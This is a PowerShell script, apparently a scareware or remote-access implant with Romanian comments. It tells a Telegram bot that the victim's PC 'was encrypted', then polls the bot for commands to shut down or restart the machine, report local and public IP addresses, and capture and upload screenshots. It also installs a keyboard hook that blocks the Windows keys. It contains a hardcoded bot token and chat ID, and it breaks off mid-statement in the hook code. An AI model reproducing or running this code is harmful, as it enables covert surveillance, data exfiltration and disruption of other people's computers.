# Configurare
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatId = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME

# Download imagine
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# Funcție Telegram
function Send-Telegram($msg) {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$msg}
}

# Trimite mesaj initial cu comenzi clare
$mesaj = @"
✅ PC-ul $user ($pc) a fost criptat cu succes!

/unlock$user
/shutdown$user
/restart$user
/screenshot$user
/info$user
"@
Send-Telegram $mesaj

# Ascultă comenzile eficient
Start-Job -ScriptBlock {
    $lastUpdate = 0
    while($true){
        try {
            $uri = "https://api.telegram.org/bot$using:botToken/getUpdates?offset=$($lastUpdate+1)&timeout=10"
            $updates = Invoke-RestMethod -Uri $uri

            foreach($update in $updates.result){
                $lastUpdate = $update.update_id
                $cmd = $update.message.text

                switch ($cmd) {
                    "/unlock$using:user" {
                        Send-Telegram "🔓 $using:user deblocat."
                        [Environment]::Exit(0)
                    }
                    "/shutdown$using:user" {
                        Send-Telegram "🛑 $using:user se închide."
                        Stop-Computer -Force
                    }
                    "/restart$using:user" {
                        Send-Telegram "🔄 $using:user repornește."
                        Restart-Computer -Force
                    }
                    "/info$using:user" {
                        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169\.254' })[0].IPAddress
                        $ipPublic = Invoke-RestMethod "https://api.ipify.org"
                        Send-Telegram "ℹ️ PC: $using:pc | User: $using:user | IP Local: $ipLocal | IP Public: $ipPublic"
                    }
                    "/screenshot$using:user" {
                        Add-Type -Assembly System.Windows.Forms,System.Drawing
                        $bmp = New-Object Drawing.Bitmap ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                        $graphics = [Drawing.Graphics]::FromImage($bmp)
                        $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
                        $path = "$env:TEMP\screenshot.jpg"
                        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Jpeg)

                        $uriPhoto = "https://api.telegram.org/bot$using:botToken/sendPhoto"
                        Invoke-RestMethod -Uri $uriPhoto -Method Post -Form @{chat_id=$using:chatId;photo=[System.IO.File]::OpenRead($path)}
                    }
                }
            }
        } catch { Start-Sleep 2 }
    }
}

# Blocare taste (C și Windows)
Add-Type @"
using System; using System.Runtime.InteropServices;
public class KeyboardMonitor {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    private const int WH_KEYBOARD_LL = 13; private const int WM_KEYDOWN = 0x0100;
    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Start() { hookId = SetHook(proc); }
    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x43) Environment.Exit(0); // C închide
            if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr
